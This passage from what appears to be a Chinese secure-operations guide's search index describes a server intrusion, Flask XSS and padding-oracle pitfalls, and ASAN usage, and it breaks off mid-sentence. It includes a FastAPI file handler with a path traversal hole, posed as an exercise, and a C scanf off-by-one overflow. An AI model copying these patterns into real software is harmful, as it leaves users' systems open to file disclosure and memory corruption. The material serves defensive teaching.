\u200b\u670d\u52a1\u5668\u200b\u88ab\u200b\u5165\u4fb5\u200b\u4e8b\u4ef6\u200b\u59cb\u672b\u200b\u3002</p> <p>\u200b\u5165\u4fb5\u200b\u7684\u200b\u8def\u5f84\u200b\u4e3a\u200b\uff1aU \u200b\u76d8\u200b\u75c5\u6bd2\u200b\u5165\u4fb5\u200b\u7b14\u8bb0\u672c\u200b\uff0c\u200b\u690d\u5165\u200b\u952e\u76d8\u8bb0\u5f55\u200b\u5668\u200b\uff0c\u200b\u6536\u96c6\u200b\u4fe1\u606f\u200b\uff0c\u200b\u534a\u4e2a\u200b\u6708\u200b\u540e\u200b\u4f7f\u7528\u200b\u952e\u76d8\u8bb0\u5f55\u200b\u5668\u200b\u5f97\u5230\u200b\u7684\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u5927\u91cf\u200b\u670d\u52a1\u5668\u200b\u5e76\u200b\u63d2\u5165\u200b\u6076\u610f\u200b\u5185\u6838\u6a21\u5757\u200b\uff0c\u200b\u4fb5\u5165\u200b\u4e86\u200b LDAP \u200b\u6570\u636e\u5e93\u200b\u5e76\u200b\u4fee\u6539\u200b\u4e86\u200b\u67d0\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4ee5\u200b\u8fdb\u4e00\u6b65\u200b\u5165\u4fb5\u200b\u3002</p>"},{"location":"ops/security/#write-applications","title":"\u7f16\u5199\u200b\u5b89\u5168\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f","text":""},{"location":"ops/security/#know-vulnerabilities","title":"\u4e86\u89e3\u200b\u5e38\u89c1\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5b89\u5168\u200b\u95ee\u9898","text":"<p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u4e86\u89e3\u200b\u5e38\u89c1\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u7f16\u5199\u7a0b\u5e8f\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u5f88\u200b\u6709\u200b\u53ef\u80fd\u200b\u5199\u4e0b\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u7684\u200b\u903b\u8f91\u200b\u800c\u200b\u4e0d\u200b\u81ea\u77e5\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u672c\u7ae0\u200b\u4ecb\u7ecd\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ecb\u7ecd\u200b\u5e76\u200b\u4e0d\u200b\u5168\u9762\u200b\u3002OWASP\uff08Open Web Application Security Project\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e13\u6ce8\u200b\u4e8e\u200b Web \u200b\u5e94\u7528\u200b\u5b89\u5168\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u8d44\u6599\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u5e2e\u52a9\u200b\uff1a</p> <ul> <li>OWASP \u200b\u5b89\u5168\u200b\u7f16\u7801\u200b\u89c4\u8303\u200b\u5feb\u901f\u200b\u53c2\u8003\u200b\u6307\u5357\u200b</li> <li>OWASP \u200b\u5341\u5927\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\u699c\u5355\u200b</li> </ul> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u7a7a\u95f2\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u5b8c\u6210\u200b\u4e00\u4e9b\u200b\u7b80\u5355\u200b\u7684\u200b CTF \u200b\u9898\u76ee\u200b\uff08\u200b\u6240\u8c13\u200b\u300c\u200b\u672a\u77e5\u200b\u653b\u200b\uff0c\u200b\u7109\u77e5\u200b\u9632\u200b\u300d\uff09\u3002\u200b\u5176\u4e2d\u200b Web \u200b\u5206\u7c7b\u200b\u5bf9\u5e94\u200b\u7f51\u7edc\u5e94\u7528\u200b\uff0cReverse/Pwn \u200b\u5206\u7c7b\u200b\u5bf9\u5e94\u200b\u4e8c\u8fdb\u5236\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u9006\u5411\u200b\u4e0e\u200b\u6f0f\u6d1e\u200b\u5229\u7528\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u76f8\u5173\u200b\u7684\u200b\u53c2\u8003\u200b\u4fe1\u606f\u200b\uff1a</p> <ul> <li>CTF Wiki</li> <li>CTF101</li> </ul>"},{"location":"ops/security/#manual-code-guideline","title":"\u624b\u518c\u200b\u4e0e\u200b\u7f16\u7801\u200b\u89c4\u8303","text":"<p>\u200b\u4e3a\u4e86\u200b\u7f16\u5199\u200b\u5b89\u5168\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u9605\u8bfb\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\u4e0e\u200b\u4f7f\u7528\u200b\u7684\u200b\u6846\u67b6\u200b\u7684\u200b\u624b\u518c\u200b\u662f\u200b\u5f88\u200b\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b\u5f88\u200b\u5bb9\u6613\u200b\u4ea7\u751f\u200b\u610f\u6599\u4e4b\u5916\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>Flask <code>render_template()</code></p> <p>Flask \u200b\u662f\u200b\u4e00\u4e2a\u200b Python \u200b\u7684\u200b\u7f51\u7ad9\u200b\u6846\u67b6\u200b\u3002\u200b\u5b83\u200b\u652f\u6301\u200b\u4f7f\u7528\u200b Jinja2 \u200b\u6a21\u677f\u200b\u6e32\u67d3\u200b HTML\u3002\u200b\u5c0f\u200b B \u200b\u56e0\u4e3a\u200b\u4e1a\u52a1\u200b\u9700\u8981\u200b\uff0c\u200b\u5199\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u7ad9\u70b9\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u4ee3\u7801\u200b\u6e32\u67d3\u200b\u4e3b\u9875\u200b\uff1a</p> <pre><code>render_template(\"index.jinja2\")\n</code></pre> <p>\u200b\u4e0a\u7ebf\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u540e\u200b\uff0cTA \u200b\u611f\u89c9\u200b\u9875\u9762\u200b\u7684\u200b\u6e32\u67d3\u200b\u4e0d\u5bf9\u52b2\u200b\uff0c\u200b\u518d\u200b\u4e00\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u7ed3\u679c\u200b\u53d1\u73b0\u200b Flask \u200b\u5c45\u7136\u200b\u6ca1\u6709\u200b\u5e2e\u200b\u4ed6\u200b\u8f6c\u4e49\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u7279\u6b8a\u5b57\u7b26\u200b\uff01\u200b\u539f\u6765\u200b\u5728\u200b Flask \u200b\u6587\u6863\u200b\u4e2d\u200b\u5173\u4e8e\u200b\u6a21\u677f\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u8fd9\u4e48\u200b\u5199\u200b\u7684\u200b\uff1a</p> <p>autoescaping is enabled for all templates ending in <code>.html</code>, <code>.htm</code>, <code>.xml</code>, <code>.xhtml</code>, as well as <code>.svg</code> when using <code>render_template()</code>.</p> <p>\u200b\u4f46\u662f\u200b TA \u200b\u4f7f\u7528\u200b\u7684\u200b\u4e0d\u662f\u200b HTML \u200b\u7684\u200b\u540e\u7f00\u200b\uff0c\u200b\u56e0\u6b64\u200b Flask \u200b\u6ca1\u6709\u200b\u505a\u200b\u81ea\u52a8\u200b\u8f6c\u4e49\u200b\uff0c\u200b\u4f7f\u5f97\u200b TA \u200b\u7684\u200b\u7f51\u7ad9\u200b\u9677\u5165\u200b\u4e86\u200b\u88ab\u200b XSS \u200b\u7684\u200b\u98ce\u9669\u200b\u4e2d\u200b\u3002\u200b\u4e07\u5e78\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u53d1\u73b0\u200b\u95ee\u9898\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u4eba\u200b\u771f\u7684\u200b\u53bb\u200b XSS\uff0c\u200b\u5426\u5219\u200b\u5c31\u200b\u8d3b\u7b11\u5927\u65b9\u200b\u4e86\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u4fdd\u6301\u826f\u597d\u200b\u7684\u200b\u7f16\u7801\u200b\u89c4\u8303\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6709\u6548\u200b\u51cf\u5c0f\u200b\u51fa\u73b0\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u7684\u200b\u6982\u7387\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5bf9\u200b\u4e00\u4e9b\u200b\u975e\u5e38\u7075\u6d3b\u200b\uff08\u200b\u4f8b\u5982\u200b Python\u3001PHP\u3001JavaScript\uff09\u200b\u6216\u8005\u200b\u9700\u8981\u200b\u8c28\u614e\u200b\u7f16\u5199\u200b\uff08\u200b\u4f8b\u5982\u200b C\uff09\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u3002\u200b\u4e00\u822c\u800c\u8a00\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b linter \u200b\u6765\u200b\u68c0\u67e5\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u4e0d\u200b\u89c4\u8303\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u90e8\u5206\u200b\u8bed\u8a00\u200b\u4e5f\u200b\u652f\u6301\u200b\u901a\u8fc7\u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b\u6765\u200b\u5173\u95ed\u200b\u4e00\u4e9b\u200b\u53ef\u80fd\u200b\u5e26\u6765\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u6216\u662f\u200b\u6dfb\u52a0\u200b\u7f16\u8bd1\u200b\u53c2\u6570\u200b\u7b49\u200b\uff08\u200b\u4f8b\u5982\u200b ASAN (<code>-fsanitize=address</code>) \u200b\u548c\u200b <code>_FORTIFY_SOURCE</code>\uff09\u200b\u52a0\u56fa\u200b\u7a0b\u5e8f\u200b\u3002</p> <p>\u200b\u601d\u8003\u9898\u200b\uff1a\u200b\u4ee3\u7801\u200b\u95ee\u9898\u200b\u5206\u6790\u200b</p> <p>\u200b\u4ee5\u4e0b\u200b\u7684\u200b Python FastAPI \u200b\u4ee3\u7801\u200b\u4fee\u6539\u200b\u81ea\u200b\u4e92\u8054\u7f51\u200b\u4e0a\u200b\u67d0\u7bc7\u200b\u535a\u5ba2\u200b\u7684\u200b\u6559\u7a0b\u200b\u3002</p> <p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u5728\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b\u4ee3\u7801\u200b\uff08\u200b\u5305\u62ec\u200b\u4e86\u200b\u5927\u200b\u8bed\u8a00\u200b\u6a21\u578b\u200b\u751f\u6210\u200b\u7684\u200b\u4ee3\u7801\u200b\uff09\u200b\u524d\u200b\uff0c\u200b\u8bf7\u200b\u603b\u662f\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u53ef\u80fd\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff01\u200b\u5bf9\u4e8e\u200b\u5927\u200b\u8bed\u8a00\u200b\u6a21\u578b\u200b\uff0c\u200b\u9057\u61be\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b\u5f3a\u8c03\u200b\u5b89\u5168\u200b\u8981\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b\u751a\u81f3\u200b\u76ee\u524d\u200b\u6700\u200b\u5f3a\u5927\u200b\u7684\u200b\u6a21\u578b\u200b\uff08\u200b\u4f8b\u5982\u200b OpenAI O1\uff09\u200b\u4e5f\u200b\u4f1a\u200b\u751f\u6210\u200b\u8fd9\u6837\u200b\u4e0d\u200b\u5b89\u5168\u200b\u7684\u200b\u4ee3\u7801\u200b<sup>1</sup>\u3002</p> <pre><code>from fastapi import FastAPI\nfrom fastapi.responses import FileResponse\nimport os\n\napp = FastAPI()\n\n@app.get(\"/\")\nasync def index():\n    return \"Hello, world!\"\n\n@app.get(\"/{whatever:path}\")\nasync def get_static_files_or_404(whatever: str):\n    file_path = os.path.join(\"dist\", whatever)\n    if os.path.isfile(file_path):\n        return FileResponse(file_path)\n    return FileResponse(\"dist/404.html\")\n</code></pre> <ol> <li>\u200b\u8bf7\u200b\u5206\u6790\u200b\u8be5\u200b\u7a0b\u5e8f\u200b\u5b58\u5728\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff0c\u200b\u5e76\u200b\u590d\u73b0\u200b\uff08\u200b\u63d0\u793a\u200b\uff1a\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bf9\u200b URL encoding \u200b\u611f\u5174\u8da3\u200b\uff09\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b\u89c4\u6a21\u200b\u8f83\u5927\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4eba\u7c7b\u200b\u8089\u773c\u200b\u68c0\u67e5\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\u7684\u200b\u5f00\u9500\u200b\u662f\u200b\u5f88\u5927\u200b\u7684\u200b\u3002\u200b\u8bf7\u200b\u5c1d\u8bd5\u200b\u5728\u200b\u672c\u5730\u200b\u4f7f\u7528\u200b\u81ea\u52a8\u5316\u200b\u7684\u200b\u4ee3\u7801\u200b\u626b\u63cf\u200b\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b CodeQL\uff09\u200b\u626b\u63cf\u200b\u51fa\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u3002</li> <li>\u200b\u5982\u679c\u200b\u4f60\u200b\u4e0d\u5f97\u4e0d\u200b\u9700\u8981\u200b\u90e8\u7f72\u200b\u4e00\u4e2a\u200b\u6709\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u7684\u200b\u5e94\u7528\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65e0\u6cd5\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b\uff08\u200b\u8be5\u200b\u7a0b\u5e8f\u200b\u53ef\u80fd\u200b\u662f\u200b\u95ed\u6e90\u200b\u7684\u200b\u5e94\u7528\u200b\uff09\u3002\u200b\u53ef\u4ee5\u200b\u91c7\u53d6\u200b\u54ea\u4e9b\u200b\u63aa\u65bd\u200b\u9632\u6b62\u200b\u76f8\u5173\u200b\u95ee\u9898\u200b\u88ab\u200b\u5229\u7528\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u88ab\u200b\u5229\u7528\u200b\u4e4b\u540e\u200b\u5f71\u54cd\u200b\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b\u5e94\u7528\u200b\uff1f</li> </ol> <p>\u200b\u4f7f\u7528\u200b ASAN \u200b\u8fd0\u884c\u200b\u65f6\u200b\u68c0\u67e5\u200b C \u200b\u4ee3\u7801\u200b\u7684\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b</p> <p>\u200b\u5bf9\u4e8e\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char input[32];\n\n    printf(\"Enter a string: \");\n    scanf(\"%32s\", input);\n    printf(\"Echo: %s (%d)\\n\", input, strlen(input));\n    return 0;\n}\n</code></pre> <p>\u200b\u7531\u4e8e\u200b C \u200b\u8bed\u8a00\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u4ee5\u200b <code>\\0</code> \u200b\u7ed3\u5c3e\u200b\uff0c<code>scanf</code> \u200b\u4f1a\u591a\u200b\u5199\u5165\u200b 0 \u200b\u5230\u200b <code>input</code> \u200b\u4ee5\u5916\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f53\u200b\u4ee3\u7801\u200b\u89c4\u6a21\u200b\u5e9e\u5927\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u95ee\u9898\u200b\u4e0d\u200b\u5bb9\u6613\u200b\u76f4\u63a5\u200b\u88ab\u200b\u53d1\u73b0\u200b\u3002 \u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u5982\u679c\u200b\u52a0\u5165\u200b ASAN \u200b\u5e76\u200b\u7f16\u8bd1\u200b\uff1a</p> <pre><code>gcc test.c -g -fsanitize=address\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5c31\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u62a5\u9519\u200b\uff1a</p> <pre><code>$ ./a.out\nEnter a string: a\n=================================================================\n==2987262==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x72bfab309040 at pc 0x72bfada6b934 bp 0x7ffceee9d380 sp 0x7ffceee9cb08\nWRITE of size 33 at 0x72bfab309040 thread T0\n    #0 0x72bfada6b933 in scanf_common /usr/src/debug/gcc/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342\n    #1 0x72bfada859ba in __isoc99_vscanf /usr/src/debug/gcc/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1489\n    #2 0x72bfada864d3 in __isoc99_scanf /usr/src/debug/gcc/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1520\n    #3 0x56cd690a1270 in main /example/test.c:8\n    #4 0x72bfad834e07 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #5 0x72bfad834ecb in __libc_start_main_impl ../csu/libc-start.c:360\n    #6 0x56cd690a10e4 in _start (/example/a.out+0x10e4) (BuildId: 1b5d9db6c98221b5cb99988ed43d50ecc2a732c8)\n\nAddress 0x72bfab309040 is located in stack of thread T0 at offset 64 in frame\n    #0 0x56cd690a11c8 in main /example/test.c:4\n\nThis frame has 1 object(s):\n    [32, 64) 'input' (line 5) &lt;== Memory access at offset 64 overflows this variable\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork\n    (longjmp and C++ exceptions *are* supported)\nSUMMARY: AddressSanitizer: stack-buffer-overflow /usr/src/debug/gcc/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342 in scanf_common\nShadow bytes around the buggy address:\n0x72bfab308d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab308e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab308e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab308f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab308f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=&gt;0x72bfab309000: f1 f1 f1 f1 00 00 00 00[f3]f3 f3 f3 00 00 00 00\n0x72bfab309080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab309100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab309180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab309200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x72bfab309280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\nAddressable:           00\nPartially addressable: 01 02 03 04 05 06 07\nHeap left redzone:       fa\nFreed heap region:       fd\nStack left redzone:      f1\nStack mid redzone:       f2\nStack right redzone:     f3\nStack after return:      f5\nStack use after scope:   f8\nGlobal redzone:          f9\nGlobal init order:       f6\nPoisoned by user:        f7\nContainer overflow:      fc\nArray cookie:            ac\nIntra object redzone:    bb\nASan internal:           fe\nLeft alloca redzone:     ca\nRight alloca redzone:    cb\n==2987262==ABORTING\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u76f8\u6bd4\u200b\u4e8e\u200b Valgrind\uff0cASAN \u200b\u7684\u200b\u5f00\u9500\u200b\u4f4e\u200b\u5f88\u591a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u4e0d\u200b\u9700\u8981\u200b\u6781\u81f4\u200b\u6027\u80fd\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5c06\u200b\u5f00\u542f\u200b ASAN \u200b\u7f16\u8bd1\u200b\u540e\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u4e0a\u7ebf\u200b\u5230\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u200b\u51cf\u8f7b\u200b\u672a\u77e5\u200b\u7684\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u5e26\u6765\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p>"},{"location":"ops/security/#no-homebrew-crypto","title":"\u4e0d\u8981\u200b\u81ea\u5236\u200b\u5bc6\u7801\u5b66\u200b\u534f\u8bae\u200b/\u200b\u7b97\u6cd5","text":"<p>\u200b\u4f5c\u4e3a\u200b\u73b0\u4ee3\u200b\u5bc6\u7801\u5b66\u200b\u7684\u200b\u5e38\u8bc6\u200b\uff0c\u200b\u5bc6\u7801\u5b66\u200b\u7b97\u6cd5\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u4ee5\u200b\u7b97\u6cd5\u200b\u4fdd\u5bc6\u200b\u4e3a\u200b\u5047\u8bbe\u200b\uff0c\u200b\u800c\u662f\u200b\u5e94\u8be5\u200b\u5728\u200b\u7b97\u6cd5\u200b\u516c\u5f00\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u5728\u200b\u5bc6\u94a5\u200b\u4e0d\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u65f6\u5019\u200b\u52a0\u5bc6\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u81ea\u5236\u200b\u5b89\u5168\u200b\u534f\u8bae\u200b\uff0c\u200b\u800c\u662f\u200b\u91c7\u7528\u200b\u6210\u719f\u200b\u7684\u200b\u5bc6\u7801\u5b66\u200b\u5e93\u200b\u4e0e\u200b\u7b97\u6cd5\u200b\u5b9e\u73b0\u200b\u5b89\u5168\u200b\u76ee\u6807\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u4e0d\u662f\u200b\u5bc6\u7801\u5b66\u200b\u4e13\u5bb6\u200b\uff0c\u200b\u4f60\u200b\u6c38\u8fdc\u200b\u65e0\u6cd5\u200b\u9884\u6599\u5230\u200b\u81ea\u5236\u200b\u7684\u200b\u65b9\u6cd5\u200b\u4f1a\u200b\u53d7\u5230\u200b\u4ec0\u4e48\u200b\u7c7b\u578b\u200b\u7684\u200b\u653b\u51fb\u200b\u3002</p> <p>\u200b\u8d8a\u200b\u9690\u853d\u200b\u8d8a\u200b\u5b89\u5168\u200b\uff1f</p> <p>\u200b\u4e00\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b\u8ba4\u8bc6\u200b\u662f\u200b\uff1a\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u522b\u4eba\u200b\u653b\u51fb\u200b\uff0c\u200b\u6280\u672f\u7ec6\u8282\u200b\u5e94\u8be5\u200b\u9690\u85cf\u200b\u5f97\u200b\u8d8a\u6df1\u200b\u8d8a\u200b\u597d\u200b\uff08Security through obscurity\uff09\u3002\u200b\u5728\u200b\u67d0\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u8fd9\u4e48\u200b\u505a\u200b\u786e\u5b9e\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u653b\u51fb\u8005\u200b\u63d0\u5347\u200b\u653b\u51fb\u200b\u7684\u200b\u96be\u5ea6\u200b\u3002\u200b\u4f46\u662f\u200b\u5b89\u5168\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8bbe\u8ba1\u200b\u7edd\u5bf9\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u4f9d\u8d56\u4e8e\u200b\u300c\u200b\u8bbe\u8ba1\u200b\u7ec6\u8282\u200b\u4e0d\u200b\u88ab\u200b\u5916\u754c\u200b\u6240\u77e5\u200b\u300d\u200b\u8fd9\u4ef6\u200b\u4e8b\u60c5\u200b\u3002</p> <p>\u200b\u641c\u72d7\u200b\u8f93\u5165\u6cd5\u200b\uff0c\u200b\u4e0e\u200b CBC padding oracle \u200b\u653b\u51fb\u200b</p> <p>2023 \u200b\u5e74\u200b 8 \u200b\u6708\u200b\uff0c\u200b\u6709\u200b\u5b89\u5168\u200b\u7814\u7a76\u8005\u200b\u53d1\u73b0\u200b\u56fd\u5185\u200b\u5305\u62ec\u200b\u641c\u72d7\u200b\u8f93\u5165\u6cd5\u200b\u5728\u5185\u200b\u7684\u200b\u8bb8\u591a\u200b\u8f93\u5165\u6cd5\u200b\u7684\u200b\u4e91\u200b\u8f93\u5165\u200b\u529f\u80fd\u200b\u6ca1\u6709\u200b\u5b9e\u73b0\u200b\u6b63\u786e\u200b\u7684\u200b\u52a0\u5bc6\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e2d\u95f4\u4eba\u200b\u53ef\u4ee5\u200b\u8f7b\u800c\u6613\u4e3e\u200b\u5730\u200b\u77e5\u9053\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u5176\u4e2d\u200b\uff0c\u200b\u641c\u72d7\u200b\u8f93\u5165\u6cd5\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u81ea\u5236\u200b\u7684\u200b \"EncryptWall\" \u200b\u52a0\u5bc6\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u5b9e\u73b0\u200b\u4f1a\u200b\u88ab\u200b CBC padding oracle \u200b\u653b\u51fb\u200b\u3002</p> <p>AES \u200b\u662f\u200b\u4e00\u79cd\u200b\u5e38\u7528\u200b\u7684\u200b\u5bf9\u79f0\u200b\u52a0\u5bc6\u7b97\u6cd5\u200b\uff0c\u200b\u800c\u200b CBC\uff08Cipher Block Chaining\uff09\u200b\u6a21\u5f0f\u200b\u662f\u200b\u94fe\u5f0f\u200b\u7684\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u5757\u200b\u7684\u200b\u5bc6\u6587\u200b\u4e0e\u200b\u524d\u200b\u4e00\u4e2a\u200b\u5757\u200b\u7684\u200b\u5bc6\u6587\u200b\u5b58\u5728\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bcf\u4e2a\u200b\u5757\u200b\u5927\u5c0f\u200b\u90fd\u200b\u9700\u8981\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u3002\u200b\u7531\u4e8e\u200b\u5bc6\u6587\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u5927\u5c0f\u200b\u4e0d\u662f\u200b\u5757\u200b\u5927\u5c0f\u200b\u7684\u200b\u6574\u6570\u500d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5757\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u90e8\u5206\u200b\u9700\u8981\u200b\u586b\u5145\u200b padding\u3002\u200b\u67d0\u4e9b\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u68c0\u6d4b\u200b padding \u200b\u586b\u5145\u200b\u5185\u5bb9\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd4\u56de\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u88ab\u200b\u79f0\u4e3a\u200b \"padding orcale\"\u3002\u200b\u901a\u8fc7\u200b padding oracle \u200b\u8fd4\u56de\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\u4fe1\u606f\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u9010\u6b65\u200b\u786e\u8ba4\u200b padding \u200b\u7684\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u8fdb\u800c\u200b\u63a8\u6d4b\u200b\u51fa\u200b\u660e\u6587\u200b\u5185\u5bb9\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u641c\u72d7\u200b\u4e91\u200b\u8f93\u5165\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5982\u679c\u200b\u586b\u5145\u200b\u4e0d\u200b\u6b63\u786e\u200b\uff0c\u200b\u670d\u52a1\u5668\u200b\u4f1a\u200b\u8fd4\u56de\u200b HTTP 